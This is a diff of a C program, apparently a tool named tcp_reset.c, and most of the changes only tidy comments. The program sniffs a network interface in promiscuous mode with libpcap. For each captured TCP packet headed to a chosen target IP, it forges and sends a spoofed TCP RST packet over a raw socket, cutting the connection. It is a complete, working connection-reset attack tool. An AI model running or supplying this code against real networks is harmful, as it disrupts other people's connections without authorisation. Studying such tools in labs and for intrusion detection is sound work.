@@ -1,4 +1,4 @@
-// to compile: gcc rst2.c -lpcap
+// to compile: gcc tcp_reset.c -lpcap
 
 #include <pcap.h>
 #include <stdio.h>
@@ -11,7 +11,7 @@
 #include <unistd.h>
 #include <linux/if_ether.h>
 
-// Function to compute the checksum of the packet
+// function to compute the checksum of the packet
 unsigned short checksum(void *b, int len) { // 'b' is a pointer to the packet, 'len' is the length
     unsigned short *buf = b;
     unsigned int sum = 0;
@@ -61,20 +61,19 @@ void send_tcp_rst(struct iphdr *iph, struct tcphdr *tcph) {
     iph_out->frag_off = 0;
     iph_out->ttl = 255;
     iph_out->protocol = IPPROTO_TCP;
-    iph_out->check = 0; // Leave checksum 0 now, fill later
-    iph_out->saddr = iph->saddr; // Swap source and destination IPs
+    iph_out->check = 0; // leave checksum 0 now, fill later
+    iph_out->saddr = iph->saddr;
     iph_out->daddr = iph->daddr;
     
-    // Assuming you already have `iph` (IP header) and `tcph` (TCP header):
     unsigned int ip_header_length = iph->ihl * 4; // IP header length in bytes
     unsigned int tcp_header_length = tcph->doff * 4; // TCP header length in bytes
-    unsigned int ip_total_length = ntohs(iph->tot_len); // Total length of IP packet (network to host byte order)
+    unsigned int ip_total_length = ntohs(iph->tot_len); // total length of IP packet (network to host byte order)
     unsigned int tcp_payload_length = ip_total_length - ip_header_length - tcp_header_length;
 
     // current sequence number
-    unsigned int seq_num = ntohl(tcph->seq); // Convert sequence number from network to host byte order
+    unsigned int seq_num = ntohl(tcph->seq); // convert sequence number from network to host byte order
 
-    // Next sequence number
+    // next sequence number
     unsigned int next_seq_num = seq_num + tcp_payload_length;
 
     printf("Next sequence number: %u\n", next_seq_num);
@@ -93,7 +92,7 @@ void send_tcp_rst(struct iphdr *iph, struct tcphdr *tcph) {
     tcph_out->ack = 0;
     tcph_out->urg = 0;
     tcph_out->window = htons(5840); /* maximum allowed window size */
-    tcph_out->check = 0; // Leave checksum 0 now, fill later
+    tcph_out->check = 0; // leave checksum 0 now, fill later
     tcph_out->urg_ptr = 0;
     
     // IP checksum
@@ -121,15 +120,15 @@ void send_tcp_rst(struct iphdr *iph, struct tcphdr *tcph) {
     tcph_out->check = checksum((unsigned short *)pseudogram, psize);
     free(pseudogram);
     
-    // Set up destination address
+    // set up destination address
     dest.sin_family = AF_INET;
-    dest.sin_port = tcph_out->dest; // Set the destination port to the correct port from the captured packet
+    dest.sin_port = tcph_out->dest; // set the destination port to the correct port from the captured packet
     dest.sin_addr.s_addr = iph_out->daddr;
 
     printf("Sending RST to IP: %s, Source Port: %d, Destination Port: %d, Sequence Number: %u\n", 
         inet_ntoa(*(struct in_addr *)&iph_out->daddr), ntohs(tcph_out->source), ntohs(tcph_out->dest), ntohl(tcph_out->seq));
 
-    // Send the packet
+    // send the packet
     if (sendto(sock, packet, iph_out->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
         perror("Send failed");
     } else {
@@ -139,7 +138,7 @@ void send_tcp_rst(struct iphdr *iph, struct tcphdr *tcph) {
     close(sock);
 }
 
-// Packet handler function
+// packet handler function
 void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
     struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ethhdr));
     struct tcphdr *tcph = (struct tcphdr *)(packet + iph->ihl * 4 + sizeof(struct ethhdr));
@@ -150,43 +149,41 @@ void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u
         inet_ntop(AF_INET, &(iph->saddr), src_ip, INET_ADDRSTRLEN);
         inet_ntop(AF_INET, &(iph->daddr), dst_ip, INET_ADDRSTRLEN);
 
-        // Assume target IP is specified in user_data
+        // assume target IP is specified in user_data
         char *target_ip = (char *)user_data;
 
-        // Check if the destination IP matches the user-specified target IP
+        // check if the destination IP matches the user-specified target IP
         if (strcmp(dst_ip, target_ip) == 0) {
             printf("Captured TCP Packet destined to IP: %s\n", dst_ip);
 
-            // Send the TCP RST packet
+            // send the TCP RST packet
             send_tcp_rst(iph, tcph);
         }
     }
 }
 
-// Main function
 int main(int argc, char *argv[]) {
     if (argc != 3) {
         fprintf(stderr, "Usage: %s <interface> <target_ip>\n", argv[0]);
         return 1;
     }
 
-    char *dev = argv[1]; // Network interface to sniff on.
-    char *target_ip = argv[2]; // Target IP address to which RST packets should be sent.
+    char *dev = argv[1]; // network interface to sniff on.
+    char *target_ip = argv[2]; // target IP address to which RST packets should be sent.
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle;
 
-    // Open the network device for packet capture in promiscuous mode
+    // open the network device for packet capture in promiscuous mode
     handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         return 2;
     }
 
-    // Start packet capture; use packet_handler to process packets
+    // start packet capture; use packet_handler to process packets
     pcap_loop(handle, 0, packet_handler, (u_char *)target_ip);
 
-    // Close the pcap session and release resources
+    // close the pcap session and release resources
     pcap_close(handle);
     return 0;
 }
-
